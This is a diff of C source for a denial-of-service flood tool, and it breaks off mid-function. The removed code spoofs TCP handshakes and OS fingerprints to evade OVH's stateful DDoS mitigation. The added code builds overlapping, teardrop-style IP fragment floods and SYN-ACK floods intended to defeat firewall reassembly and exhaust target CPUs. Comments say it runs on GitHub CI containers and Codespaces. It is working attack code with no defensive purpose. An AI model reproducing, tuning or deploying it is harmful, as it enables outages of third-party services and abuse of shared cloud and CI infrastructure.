@@ -1449,15 +1449,13 @@ void *worker_thread(void *arg) {
             }
         }
     }
-    if (args.is_v17_tcp_bypass) {
-        // === V18 OVH FULL BYPASS ENGINE ===
-        // Strategy: ALL packets = full MTU 1514B for max Gbps/PPS
-        //   Hot send loop: PSH+ACK + ACK + RST+ACK mix at 1460B payload
-        //   Variable: TTL, window, src_port, seq, IP ID, payload type
-        //   3WHS: dedicated recv thread reads SYN-ACK → sends ACK to complete handshake
-        //         Once completed, slot marked ESTABLISHED -> passes stateful FW
-        //   Result: 9+ Gbps + bypass OVH VAC stateful inspection
-
+    // ======================================================================
+    // FRAGMENTATION FLOOD + SYN-ACK FLOOD ENGINE
+    // Replaces v17_tcp_bypass — optimized for GitHub CI container environment
+    // frag_flood: IP fragments with overlapping/non-sequential offsets → FW bypass
+    // synack_flood: perfect SYN-ACK packets → CPU exhaustion on target
+    // ======================================================================
+    if (args.is_frag_flood || args.is_synack_flood) {
         int nc=sysconf(_SC_NPROCESSORS_ONLN);
         cpu_set_t cset; CPU_ZERO(&cset);
         CPU_SET(tid%nc,&cset);
@@ -1480,12 +1478,12 @@ void *worker_thread(void *arg) {
 
         unsigned char gw_mac[6]={0};
         {unsigned int gw_ip=0;
-         FILE *fr=fopen("/proc/net/route","r");
-         if(fr){char ln[256];
-           while(fgets(ln,sizeof(ln),fr)){char ri[32];unsigned long rd,rg;
+         FILE *frt=fopen("/proc/net/route","r");
+         if(frt){char ln[256];
+           while(fgets(ln,sizeof(ln),frt)){char ri[32];unsigned long rd,rg;
              if(sscanf(ln,"%31s %lx %lx",ri,&rd,&rg)==3&&rd==0&&rg!=0){
                gw_ip=(unsigned int)rg;break;}}
-           fclose(fr);}
+           fclose(frt);}
          if(gw_ip){struct in_addr ga;ga.s_addr=gw_ip;
            char cmd[128];snprintf(cmd,sizeof(cmd),"ping -c1 -W1 %s>/dev/null 2>&1",inet_ntoa(ga));
            if(system(cmd)){} usleep(50000);
@@ -1500,13 +1498,11 @@ void *worker_thread(void *arg) {
                  break;}}
              fclose(fa);}}}
 
-        // Auto-detect: try AF_PACKET (full VM), fall back to AF_INET SOCK_RAW (container)
+        // Auto-detect: AF_PACKET (full VM) vs AF_INET SOCK_RAW (container/CI)
         int _probe = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
         int use_afp = (_probe >= 0);
         if (_probe >= 0) close(_probe);
-        if (!use_afp) {
-            LOG_INFO("T%d: AF_PACKET unavailable (container mode) -> AF_INET SOCK_RAW fallback", tid);
-        }
+        if (!use_afp) LOG_INFO("T%d: container mode -> AF_INET SOCK_RAW", tid);
 
         int fd_send, fd_send2;
         if(use_afp){
@@ -1529,876 +1525,426 @@ void *worker_thread(void *arg) {
          setsockopt(fd_send2,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
         }
 
-        struct sockaddr_ll dst_sll={0};
-        dst_sll.sll_family=AF_PACKET;dst_sll.sll_ifindex=ifindex;
-        dst_sll.sll_halen=6;memcpy(dst_sll.sll_addr,gw_mac,6);
-        dst_sll.sll_protocol=htons(ETH_P_IP);
+        struct sockaddr_ll nf_sll={0};
+        nf_sll.sll_family=AF_PACKET;nf_sll.sll_ifindex=ifindex;
+        nf_sll.sll_halen=6;memcpy(nf_sll.sll_addr,gw_mac,6);
+        nf_sll.sll_protocol=htons(ETH_P_IP);
 
-        // Raw socket fallback destination (used when GW MAC not available)
-        struct sockaddr_in raw_dst={0};
-        raw_dst.sin_family=AF_INET;
-        raw_dst.sin_addr.s_addr=bin_target_ip;
-        raw_dst.sin_port=bin_target_port; // not used by kernel for IPPROTO_RAW
+        struct sockaddr_in nf_raw={0};
+        nf_raw.sin_family=AF_INET;
+        nf_raw.sin_addr.s_addr=bin_target_ip;
 
-        // Recv socket for SYN-ACK (3WHS completion)
-        int fd_recv;
-        if (use_afp) {
-            fd_recv = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-            {
-                // BPF: only accept TCP SYN-ACK from our target IP
-                unsigned int tip = ntohl(bin_target_ip);
-                struct sock_filter bpf_syn_ack[] = {
-                    { 0x28, 0, 0, 0x0000000c },
-                    { 0x15, 0, 11, 0x00000800 },
-                    { 0x30, 0, 0, 0x00000017 },
-                    { 0x15, 0, 9,  0x00000006 },
-                    { 0x20, 0, 0, 0x0000001a },
-                    { 0x15, 0, 7, tip },
-                    { 0x28, 0, 0, 0x00000014 },
-                    { 0x45, 5, 0, 0x00001fff },
-                    { 0xb1, 0, 0, 0x0000000e },
-                    { 0x50, 0, 0, 0x0000001b },
-                    { 0x54, 0, 0, 0x00000012 },
-                    { 0x15, 0, 1, 0x00000012 },
-                    { 0x6,  0, 0, 0x00040000 },
-                    { 0x6,  0, 0, 0x00000000 },
-                };
-                struct sock_fprog prog={sizeof(bpf_syn_ack)/sizeof(bpf_syn_ack[0]),bpf_syn_ack};
-                setsockopt(fd_recv,SOL_SOCKET,SO_ATTACH_FILTER,&prog,sizeof(prog));
-                int rb=512*1024; setsockopt(fd_recv,SOL_SOCKET,SO_RCVBUF,&rb,sizeof(rb));
-            }
-        } else {
-            // Container mode: AF_INET SOCK_RAW receives IP+TCP (no ETH header)
-            // CAP_NET_RAW is sufficient for this — works in GitHub Codespaces
-            fd_recv = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-            int rb = 512*1024; setsockopt(fd_recv, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
-        }
-
-        // === CONSTANTS ===
-        #define V17B     4096
-        #define V17ETH   14
-        #define V17IP    20
-        #define V17TCP   32   // 20 hdr + 12 option bytes (NOP,NOP,TS,tsval[4],tsecr[4])
-        #define V17PL   1428  // Reduced by 12 to keep total frame <= 1514
-        #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
-        #define HUGE_PL_SIZE (1024 * 1024) // 1MB random payload buffer
-
-        // Slot state
-        #define ST_SYN_SENT    0
-        #define ST_ESTABLISHED 1
-        #define ST_FORCE_EST   2  // Fallback: blast without 3WHS (for stateless FW/router paths)
-
-        // Max SYN retries before falling back to force blast
-        // 3 retries ≈ ~30 rounds ≈ fast enough for stateful, fallback quick enough for stateless
-        #define SYN_MAX_RETRY  3
-
-        // No ramp — full power from round 1
-        #define SOFT_START_ROUNDS 1
-
-
-
-        // TTL table (expanded: Linux/Win/Mac/FreeBSD/Cisco/Solaris/AIX)
-        static const unsigned char ttl_t[]={
+        // OS fingerprint tables
+        static const unsigned char nf_ttl[]={
             64,64,64,63,128,128,64,117,255,63,64,128,64,60,
             64,128,64,64,117,64,64,128,64,63,255,64,60,128,
             64,63,128,255,64,64,128,64};
-        int ttl_sz=sizeof(ttl_t);
-
-        // Window table (expanded: more OS fingerprints)
-        static const unsigned short win_t[]={
+        int nf_ttl_n=sizeof(nf_ttl);
+        static const unsigned short nf_win[]={
             8192,16384,32768,65535,29200,14600,43690,
             26880,8760,32120,16060,26280,65535,4096,
             28960,14480,5840,5792,65520,64240,32767};
-        int win_sz=(int)(sizeof(win_t)/sizeof(win_t[0]));
+        int nf_win_n=(int)(sizeof(nf_win)/sizeof(nf_win[0]));
 
-        // Allocate per-slot data (heap, not stack)
-        unsigned char (*vbuf)[V17FLEN]=malloc(V17B*V17FLEN);
-        struct mmsghdr *vmsg=calloc(V17B,sizeof(struct mmsghdr));
-        struct iovec   *viov=calloc(V17B,sizeof(struct iovec));
-        unsigned int *tcp_base=calloc(V17B,sizeof(unsigned int));
-        unsigned int *ip_base =calloc(V17B,sizeof(unsigned int));
-        unsigned int *slot_seq=calloc(V17B,sizeof(unsigned int));
-        unsigned int *slot_ack=calloc(V17B,sizeof(unsigned int));
-        unsigned short*slot_sp=calloc(V17B,sizeof(unsigned short));
-        int           *slot_st=calloc(V17B,sizeof(int)); // state
-        unsigned int  *slot_rn=calloc(V17B,sizeof(unsigned int)); // round counter
-        unsigned int  *slot_syn_sent=calloc(V17B,sizeof(unsigned int));
-        unsigned char *slot_ttl=calloc(V17B,sizeof(unsigned char)); // Fixed TTL per slot
-        unsigned short*slot_win=calloc(V17B,sizeof(unsigned short)); // Fixed window per slot
-        unsigned char *slot_tls_ver=calloc(V17B,sizeof(unsigned char)); // Fixed TLS version per slot
-        unsigned char *slot_ch_sent=calloc(V17B,sizeof(unsigned char)); // ClientHello sent flag
-        unsigned int  *slot_tsval=calloc(V17B,sizeof(unsigned int)); // TCP timestamp value per slot
-        unsigned int  *slot_tsecr=calloc(V17B,sizeof(unsigned int)); // TCP timestamp echo reply (server tsval)
-        unsigned char *slot_wscale=calloc(V17B,sizeof(unsigned char)); // Window scale factor per slot
-        unsigned int  *slot_pl_sum=calloc(V17B,sizeof(unsigned int)); // Cached payload checksum
-        unsigned short *slot_ipid=calloc(V17B,sizeof(unsigned short)); // DWC: sequential IP ID per connection
+        #define NF_ETH 14
+        #define NF_IP  20
+        #define NF_TCP 20
 
-        // Huge Payload Buffer for O(1) random data & DPI bypass
-        unsigned char *huge_pl_buf = malloc(HUGE_PL_SIZE);
-        unsigned int *huge_pl_sum = calloc(HUGE_PL_SIZE / 2 + 1, sizeof(unsigned int));
-        if(!huge_pl_buf || !huge_pl_sum) {
-            LOG_ERR("T%d: HUGE_PL_SIZE malloc failed", tid);
-            return NULL;
-        }
+        // ================================================================
+        // FRAGMENTATION FLOOD
+        // ================================================================
+        if (args.is_frag_flood) {
+            // Strategy: Send IP-fragmented TCP packets with:
+            //   - Overlapping fragment offsets (confuses FW reassembly)
+            //   - Non-sequential fragment order (defeats ordered reassembly)
+            //   - Duplicate fragments with different data (ambiguous reassembly)
+            //   - Variable fragment sizes (defeats fixed-size pattern detection)
+            // GitHub CI: works on container (AF_INET SOCK_RAW) and VM (AF_PACKET)
 
-        // Init Huge Buffer & Prefix Sum with High Entropy Random Data for L4 Bypass
-        unsigned int current_sum = 0;
-        unsigned short *hpw = (unsigned short *)huge_pl_buf;
-        huge_pl_sum[0] = 0;
-        for (int k = 0; k < HUGE_PL_SIZE / 2; k++) {
-            hpw[k] = (unsigned short)(fast_rand() & 0xFFFF);
-            current_sum += hpw[k];
-            huge_pl_sum[k + 1] = current_sum;
-        }
+            #define FRAG_B 4096
+            #define FRAG_MAXPKT (NF_ETH + NF_IP + 1480)
 
-        // Realistic timestamp base: approximate kernel boot jiffies (250Hz)
-        unsigned int ts_boot_base = (unsigned int)(time(NULL) % 86400) * 250;
+            LOG_INFO("T%d: FRAG-FLOOD iface=%s %s batch=%d",
+                     tid, iface, use_afp?"AF_PACKET":"RAW", FRAG_B);
+            fflush(stdout);
 
-        // sport→slot lookup for recv processing (full random range now)
-        int *port_to_slot = malloc(65536 * sizeof(int));
-        for(int i=0; i<65536; i++) port_to_slot[i] = -1;        // Initialize all slots
-        for(int b=0;b<V17B;b++){
-            memset(vbuf[b],0,V17FLEN);
-            unsigned char *fr=vbuf[b];
+            unsigned char *fbuf = malloc((size_t)FRAG_B * FRAG_MAXPKT);
+            struct mmsghdr *fmsg = calloc(FRAG_B, sizeof(struct mmsghdr));
+            struct iovec *fiov = calloc(FRAG_B, sizeof(struct iovec));
+            if(!fbuf||!fmsg||!fiov){LOG_ERR("T%d: malloc fail",tid);return NULL;}
 
-            // Ethernet
-            if(use_afp){memcpy(fr,gw_mac,6);memcpy(fr+6,src_mac,6);fr[12]=8;fr[13]=0;}
+            // 1MB random buffer for payload diversity + DPI bypass
+            #define FRAG_RBUF_SZ (1024*1024)
+            unsigned char *rbuf = malloc(FRAG_RBUF_SZ);
+            for(int i=0;i<FRAG_RBUF_SZ;i++) rbuf[i]=(unsigned char)(fast_rand()&0xFF);
 
-            // IP
-            struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
-            ih->ihl=5;ih->version=4;ih->tot_len=htons(V17IP+V17TCP+V17PL);
-            ih->frag_off=htons(0x4000); // DWC FIX: Always DF — modern OS never sends without DF
-            ih->ttl=ttl_t[b%ttl_sz];
-            ih->protocol=IPPROTO_TCP;
-            ih->saddr=src_ip; ih->daddr=bin_target_ip;
+            while(1) {
+                int npkt = 0;
+                int logical_pkts = FRAG_B / 3; // ~1365 logical packets -> ~4096 fragments
 
-            // TCP RST bypass — mixed flags
-            struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
-            unsigned short p;
-            do { p = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p] != -1);
-            slot_sp[b]=p;
-            port_to_slot[p]=b;
-            slot_seq[b]=fast_rand();
-            slot_ack[b]=fast_rand();
-            // 100% stateful 3WHS — FW creates real session entries, won't drop data
-            slot_st[b]=ST_SYN_SENT;
-            slot_rn[b]=b;
-            slot_ttl[b]=ttl_t[fast_rand()%ttl_sz]; // Fixed TTL per connection
-            slot_win[b]=win_t[fast_rand()%win_sz]; // Fixed window per connection
-            unsigned char tls_v_choices[] = {0x01, 0x03, 0x03};
-            slot_tls_ver[b]=tls_v_choices[fast_rand()%3];
-            slot_ch_sent[b]=0;
-            // Fix 5: Realistic tsval — jitter per slot around boot-approx base
-            slot_tsval[b] = ts_boot_base + (unsigned int)(b * 997) + (fast_rand() % 1000);
-            slot_tsecr[b]=0; // Will be set from SYN-ACK
-            slot_wscale[b]=0; // Will be set from SYN options
-            slot_pl_sum[b]=0;
-            slot_ipid[b]=fast_rand()&0xFFFF; // Sequential IP ID, random start per connection
+                for(int lp=0; lp<logical_pkts && npkt<FRAG_B-3; lp++) {
+                    unsigned short ipid = fast_rand() & 0xFFFF;
+                    unsigned char ttl = nf_ttl[fast_rand() % nf_ttl_n];
+                    unsigned short sport = (unsigned short)(1024 + (fast_rand() % 64000));
+                    unsigned int seq_n = fast_rand();
+                    unsigned int ack_n = fast_rand();
+                    unsigned short win = nf_win[fast_rand() % nf_win_n];
 
-            th->source=htons(slot_sp[b]);
-            th->dest=bin_target_port;
-            th->doff=8; th->psh=1; th->ack=1; // doff=8: 32 bytes header (20 hdr + 12 TS option)
-            th->seq=htonl(slot_seq[b]);
-            th->ack_seq=htonl(slot_ack[b]);
-            th->window=htons(win_t[b%win_sz]);
+                    // 8 fragment patterns — each confuses different FW implementations
+                    int pat = fast_rand() % 8;
+                    // off8 = fragment offset in 8-byte units, plen = payload bytes, mf = More Fragments
+                    int off8[3], plen[3], mf_flag[3], nf_count;
 
-            // Write TCP Timestamp option (NOP, NOP, TS kind=8 len=10, tsval, tsecr)
-            unsigned char *ts_opt = fr + V17ETH + V17IP + 20;
-            ts_opt[0]=1; ts_opt[1]=1;        // NOP, NOP
-            ts_opt[2]=8; ts_opt[3]=10;       // kind=8, len=10
-            *((unsigned int*)(ts_opt+4)) = htonl(slot_tsval[b]);
-            *((unsigned int*)(ts_opt+8)) = 0; // tsecr=0 until 3WHS completes
-
-            // Build payload pointer (after 32-byte TCP header)
-            unsigned char *pl=fr+V17ETH+V17IP+V17TCP;
-
-            // Pre-compute TCP checksum base (fixed fields: src_ip, dst_ip, proto, dport, NOP+NOP, TS-kind+len)
-            unsigned short *tw=(unsigned short*)th;
-            unsigned int cs=0;
-            cs+=(src_ip&0xFFFF)+(src_ip>>16);
-            cs+=(bin_target_ip&0xFFFF)+(bin_target_ip>>16);
-            cs+=htons(IPPROTO_TCP);
-            cs+=tw[1]; // dport (fixed)
-            // Fixed TS option prefix: NOP(0x01)+NOP(0x01)=0x0101, kind(0x08)+len(0x0a)=0x080a
-            cs += htons(0x0101); // tw[10]
-            cs += htons(0x080a); // tw[11]
-            tcp_base[b]=cs;
-
-
-
-            // Pre-compute IP checksum base (exclude: tot_len, id, check)
-            unsigned short *iw=(unsigned short*)ih;
-            unsigned int ipttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
-            ip_base[b]=iw[0]+iw[3]+htons(ipttlproto)+iw[6]+iw[7]+iw[8]+iw[9];
-
-
-            viov[b].iov_base=use_afp?fr:(fr+V17ETH);
-            viov[b].iov_len=use_afp?V17FLEN:(V17IP+V17TCP+V17PL);
-            vmsg[b].msg_hdr.msg_iov=&viov[b];
-            vmsg[b].msg_hdr.msg_iovlen=1;
-            vmsg[b].msg_hdr.msg_name=use_afp?(void*)&dst_sll:(void*)&raw_dst;
-            vmsg[b].msg_hdr.msg_namelen=use_afp?sizeof(dst_sll):sizeof(raw_dst);
-        }
-
-        LOG_INFO("T%d: %s iface=%s mode=%s batch=%d pkt=%d",
-                 tid, args.is_v18_tls ? "v18 TLS-BYPASS" : "v17 OVH-BYPASS",
-                 iface,use_afp?"AF_PACKET":"RAW",V17B,use_afp?V17FLEN:V17IP+V17TCP+V17PL);
-        fflush(stdout); // force log output
-
-        // === RECV + SYN BUFFERS on HEAP (avoid stack overflow with 8 threads) ===
-        unsigned char *recv_buf = malloc(4096);
-        unsigned char *syn_buf  = malloc(V17FLEN);
-        unsigned char *ack_buf  = malloc(V17FLEN); // reused per SYN-ACK response
-        if(!recv_buf||!syn_buf||!ack_buf){
-            LOG_ERR("T%d: malloc failed",tid);
-            return NULL;
-        }
-        memset(syn_buf,0,V17FLEN);
-        if(use_afp){memcpy(syn_buf,gw_mac,6);memcpy(syn_buf+6,src_mac,6);
-                    syn_buf[12]=8;syn_buf[13]=0;}
-        {struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
-         ih2->ihl=5;ih2->version=4;ih2->tot_len=htons(V17IP+40); // 20 TCP options
-         ih2->frag_off=htons(0x4000);ih2->ttl=128;ih2->protocol=IPPROTO_TCP; // Win10 TTL=128
-         ih2->saddr=src_ip;ih2->daddr=bin_target_ip;
-         struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
-         th2->doff=10;th2->syn=1;th2->dest=bin_target_port;
-         th2->window=htons(64240); // Win10 SYN Window
-         
-         // TCP options: MSS=1460, SACK_PERM, TS, WScale=8 (Real Win10 Fingerprint)
-         unsigned char *op=syn_buf+V17ETH+V17IP+20;
-         op[0]=2; op[1]=4; op[2]=0x05; op[3]=0xb4; // MSS 1460
-         op[4]=1; op[5]=3; op[6]=3; op[7]=8;       // NOP, WScale 8
-         op[8]=1; op[9]=1; op[10]=4; op[11]=2;     // NOP, NOP, SACK Permitted
-         op[12]=8; op[13]=10;                      // Timestamp Option
-         *((unsigned int*)(op+14)) = fast_rand();  // TSVal (will be updated per packet)
-         *((unsigned int*)(op+18)) = 0;            // TSecr = 0 for SYN
-        }
-         
-        // Setup ACK Buffer (Pure ACK, No Payload)
-        memset(ack_buf,0,V17FLEN);
-        if(use_afp){memcpy(ack_buf,gw_mac,6);memcpy(ack_buf+6,src_mac,6);
-                    ack_buf[12]=8;ack_buf[13]=0;}
-        {struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-         ih3->ihl=5;ih3->version=4;ih3->tot_len=htons(V17IP+V17TCP);
-         ih3->frag_off=htons(0x4000);ih3->ttl=64;ih3->protocol=IPPROTO_TCP;
-         ih3->saddr=src_ip;ih3->daddr=bin_target_ip;
-         struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-         th3->doff=5;th3->ack=1;th3->dest=bin_target_port;
-         th3->window=htons(65535);}
-
-
-
-        unsigned int round=0;
-        // Main attack loop
-        while(1){
-            round++;
-            // === STATEFUL MODE: 3-Way Handshake ===
-            // 1. Send SYN — Fix 2: SYN rate budget per round to avoid OVH HCAP
-            // HCAP triggers at ~200 SYN/s per source IP. We limit to 64-127 new SYNs/round.
-            // Shock-start: first 50 rounds blast ALL slots to exploit pre-VAC activation window
-            // (~0.5s before OVH VAC fully activates), then throttle to sustain mode.
-            int syn_budget = (round <= 50) ? (int)V17B : (64 + (int)(fast_rand() % 64));
-            for(int b=0;b<V17B && syn_budget > 0;b++){
-                if(slot_st[b]==ST_SYN_SENT){
-                    syn_budget--;
-                    // Soft start: don't activate slot until its wave arrives
-                    unsigned int activate_round = (unsigned int)((unsigned long long)b * SOFT_START_ROUNDS / V17B);
-                    if(round < activate_round) continue;
-
-                    // Exponential SYN backoff: 10→20→40→80→160 rounds
-                    unsigned int syn_retries = slot_syn_sent[b] > 0 ? (round > slot_syn_sent[b] ? 1 : 0) : 0;
-                    unsigned int retry_interval = 10 << (syn_retries > 4 ? 4 : syn_retries);
-                    if(round - slot_syn_sent[b] < retry_interval && slot_syn_sent[b] != 0) continue;
-                    slot_syn_sent[b] = round;
-
-                    struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
-                    ih2->id=htons(fast_rand()&0xFFFF);
-                    ih2->check=0;
-                    unsigned int ic2=0;
-                    unsigned short *iw2 = (unsigned short*)ih2;
-                    for(int i=0; i<10; i++) ic2 += iw2[i];
-                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
-                    ih2->check = (unsigned short)~ic2;
-
-                    struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
-                    th2->source=htons(slot_sp[b]);
-                    th2->seq=htonl(slot_seq[b]);
-                    th2->check=0;
-                    
-                    // Randomize TCP Options per connection to bypass SYN Fingerprinting
-                    unsigned char *op = syn_buf+V17ETH+V17IP+20;
-                    int opt_len = 0;
-                    unsigned int r_opt = fast_rand() % 4; // 4 different OS profiles
-
-                    if (r_opt == 0) {
-                        // Windows/Chrome profile: MSS=1460, SACK, TS, WScale=8
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
-                        op[4]=4;op[5]=2;                       // SACK
-                        op[6]=8;op[7]=10;                      // Timestamps (value filled later if needed, left 0 for now)
-                        *((unsigned int*)(op+8)) = fast_rand(); // Random TS val
-                        *((unsigned int*)(op+12)) = 0;         // TS echo reply
-                        op[16]=1;op[17]=3;op[18]=3;op[19]=8;   // NOP, WScale=8
-                        opt_len = 20;
-                    } else if (r_opt == 1) {
-                        // Linux profile: MSS=1440, SACK, TS, WScale=7
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xA0; // MSS=1440
-                        op[4]=4;op[5]=2;                       // SACK
-                        op[6]=8;op[7]=10;                      // Timestamps
-                        *((unsigned int*)(op+8)) = fast_rand();
-                        *((unsigned int*)(op+12)) = 0;
-                        op[16]=1;op[17]=3;op[18]=3;op[19]=7;   // NOP, WScale=7
-                        opt_len = 20;
-                    } else if (r_opt == 2) {
-                        // iOS/Safari profile: MSS=1400, NOP, WScale=6, NOP, NOP, TS, SACK, EOL
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0x78; // MSS=1400
-                        op[4]=1;op[5]=3;op[6]=3;op[7]=6;       // NOP, WScale=6
-                        op[8]=1;op[9]=1;op[10]=8;op[11]=10;    // NOP, NOP, TS
-                        *((unsigned int*)(op+12)) = fast_rand();
-                        *((unsigned int*)(op+16)) = 0;
-                        op[20]=4;op[21]=2;op[22]=0;op[23]=0;   // SACK, EOL (requires 24 bytes options)
-                        opt_len = 24;
-                    } else {
-                        // Basic profile (e.g. IoT/Simple stack): MSS=1460, NOP, WScale=4
-                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
-                        op[4]=1;op[5]=3;op[6]=3;op[7]=4;       // NOP, WScale=4
-                        op[8]=0;op[9]=0;op[10]=0;op[11]=0;     // EOL padding
-                        opt_len = 12; // 12 bytes options
+                    switch(pat) {
+                    case 0: // Overlap middle: frag1 overlaps frag0 by 32B
+                        off8[0]=0;  plen[0]=64;  mf_flag[0]=1;
+                        off8[1]=4;  plen[1]=128; mf_flag[1]=1;  // offset 32B, overlaps 32B
+                        off8[2]=20; plen[2]=256; mf_flag[2]=0;  // offset 160B
+                        nf_count=3; break;
+                    case 1: // Duplicate offset 0 — different payload confuses reassembly
+                        off8[0]=0;  plen[0]=128; mf_flag[0]=1;
+                        off8[1]=0;  plen[1]=128; mf_flag[1]=1;  // SAME offset, different payload
+                        off8[2]=16; plen[2]=512; mf_flag[2]=0;
+                        nf_count=3; break;
+                    case 2: // Reverse order + gap — high offset first
+                        off8[0]=40; plen[0]=256; mf_flag[0]=0;
+                        off8[1]=0;  plen[1]=96;  mf_flag[1]=1;
+                        nf_count=2; break;
+                    case 3: // Tiny overlapping fragments — evade minimum fragment check
+                        off8[0]=0;  plen[0]=24;  mf_flag[0]=1;
+                        off8[1]=1;  plen[1]=24;  mf_flag[1]=1;  // offset 8B, overlaps 16B
+                        off8[2]=3;  plen[2]=64;  mf_flag[2]=0;  // offset 24B
+                        nf_count=3; break;
+                    case 4: // Large overlap (50%) — FW must decide which data is "correct"
+                        off8[0]=0;  plen[0]=512; mf_flag[0]=1;
+                        off8[1]=32; plen[1]=512; mf_flag[1]=0;  // offset 256B, overlaps 256B
+                        nf_count=2; break;
+                    case 5: // Out-of-order: high, low, middle
+                        off8[0]=100;plen[0]=1024;mf_flag[0]=0;  // offset 800B first
+                        off8[1]=0;  plen[1]=128; mf_flag[1]=1;  // then offset 0
+                        off8[2]=16; plen[2]=256; mf_flag[2]=1;  // then middle 128B
+                        nf_count=3; break;
+                    case 6: // Triple overlap at offset 0 — maximum confusion
+                        off8[0]=0;  plen[0]=64;  mf_flag[0]=1;
+                        off8[1]=0;  plen[1]=96;  mf_flag[1]=1;  // bigger frag at same offset
+                        off8[2]=8;  plen[2]=256; mf_flag[2]=0;  // offset 64B
+                        nf_count=3; break;
+                    default: // Teardrop-style: overlapping with gap
+                        off8[0]=0;  plen[0]=256; mf_flag[0]=1;
+                        off8[1]=24; plen[1]=256; mf_flag[1]=1;  // offset 192B, overlap 64B
+                        off8[2]=48; plen[2]=128; mf_flag[2]=0;  // offset 384B, gap from frag0
+                        nf_count=3; break;
                     }
-                    
-                    // Adjust IP and TCP header lengths based on random options
-                    ih2->tot_len=htons(V17IP+20+opt_len);
-                    th2->doff=(20+opt_len)/4;
 
-                    // Recalculate IP Checksum with new tot_len
-                    ih2->check=0;
-                    ic2=0;
-                    for(int i=0; i<10; i++) ic2 += iw2[i];
-                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
-                    ih2->check = (unsigned short)~ic2;
+                    for(int fi=0; fi<nf_count && npkt<FRAG_B; fi++) {
+                        unsigned char *pkt = fbuf + (size_t)npkt * FRAG_MAXPKT;
+                        memset(pkt, 0, NF_ETH + NF_IP);
 
-                    // Recalculate TCP Checksum with new options
-                    th2->check=0;
-                    unsigned short *tw2 = (unsigned short*)th2;
-                    unsigned int cs2 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+opt_len);
-                    for(int i=0; i<(20+opt_len)/2; i++) cs2 += tw2[i]; 
-                    cs2 = (cs2>>16)+(cs2&0xFFFF); cs2 += (cs2>>16);
-                    th2->check = (unsigned short)~cs2;
-                    
-                    if(use_afp){
-                        int s = sendto(fd_send,syn_buf,V17ETH+V17IP+20+opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                        // (Removed to prevent log spam)
-                    } else {
-                        int s = sendto(fd_send,syn_buf+V17ETH,V17IP+20+opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                        if(round==1 && b==0) { LOG_INFO("T%d: sendto AF_INET SYN returned %d (err: %s)", tid, s, strerror(errno)); fflush(stdout); }
-                    }
-                }
-            }
-
-            // 2. Recv SYN-ACK + server data ACK (Fix 3: ACK server data to prevent zombie detect)
-            int eth_off = use_afp ? V17ETH : 0;
-            int rcvd=0;
-            while((rcvd=recv(fd_recv,recv_buf,4096,MSG_DONTWAIT))>0){
-                if(rcvd < eth_off + V17IP + 20) continue;
-                struct iphdr *rih=(struct iphdr*)(recv_buf + eth_off);
-                if(rih->protocol!=IPPROTO_TCP) continue;
-                if(rih->saddr != bin_target_ip) continue;
-                struct tcphdr *rth=(struct tcphdr*)(recv_buf + eth_off + (rih->ihl<<2));
-                unsigned short dport=ntohs(rth->dest);
-                int b = port_to_slot[dport];
-
-                if(rth->syn && rth->ack && b >= 0 && slot_st[b]==ST_SYN_SENT) {
-                // === SYN-ACK: complete 3WHS ===
-                    slot_ack[b]=ntohl(rth->seq)+1;
-                    slot_seq[b]++;
-                    
-                    unsigned int server_tsval = 0;
-                    int r_opt_len = (rth->doff * 4) - 20;
-                    unsigned char *r_opt = (unsigned char *)rth + 20;
-                    for (int i = 0; i < r_opt_len; ) {
-                        if (r_opt[i] == 0) break;
-                        if (r_opt[i] == 1) { i++; continue; }
-                        if (r_opt[i+1] < 2) break; // malformed option guard
-                        if (r_opt[i] == 8 && r_opt[i+1] == 10 && i + 10 <= r_opt_len) {
-                            server_tsval = ntohl(*((unsigned int*)(r_opt + i + 2)));
-                            break;
+                        if(use_afp){
+                            memcpy(pkt, gw_mac, 6);
+                            memcpy(pkt+6, src_mac, 6);
+                            pkt[12]=0x08; pkt[13]=0x00;
                         }
-                        // Extract server WScale from SYN-ACK
-                        if (r_opt[i] == 3 && r_opt[i+1] == 3 && i + 3 <= r_opt_len) {
-                            slot_wscale[b] = r_opt[i+2] > 14 ? 14 : r_opt[i+2];
+
+                        struct iphdr *ih = (struct iphdr*)(pkt + NF_ETH);
+                        ih->ihl=5; ih->version=4;
+                        int pl = plen[fi];
+                        // Non-last fragments: payload must be multiple of 8 (IP spec)
+                        if(mf_flag[fi] && (pl & 7)) pl = (pl + 7) & ~7;
+                        if(pl > 1480) pl = 1480;
+                        ih->tot_len = htons(NF_IP + pl);
+                        ih->id = htons(ipid);
+                        ih->frag_off = htons((unsigned short)((mf_flag[fi] ? 0x2000 : 0) | (off8[fi] & 0x1FFF)));
+                        ih->ttl = ttl;
+                        ih->protocol = IPPROTO_TCP;
+                        ih->saddr = src_ip;
+                        ih->daddr = bin_target_ip;
+
+                        unsigned char *payload = pkt + NF_ETH + NF_IP;
+                        if(off8[fi] == 0) {
+                            // First fragment: contains TCP header + random data
+                            struct tcphdr *th = (struct tcphdr*)payload;
